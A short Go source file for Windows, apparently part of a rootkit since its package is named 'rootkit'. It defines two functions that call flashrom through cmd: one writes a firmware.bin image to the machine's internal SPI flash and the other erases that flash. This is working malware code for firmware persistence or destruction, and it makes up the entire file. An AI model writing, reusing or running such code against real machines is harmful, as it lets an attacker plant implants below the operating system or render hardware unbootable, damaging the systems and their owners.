//go:build windows

package rootkit

import (
"os/exec"
)

func SPIWrite() bool {
cmd := exec.Command("cmd", "/c", "flashrom.exe -p internal -w firmware.bin")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func SPIErase() bool {
cmd := exec.Command("cmd", "/c", "flashrom.exe -p internal -E")
err := cmd.Run()
if err != nil {
return false
}
return true
}
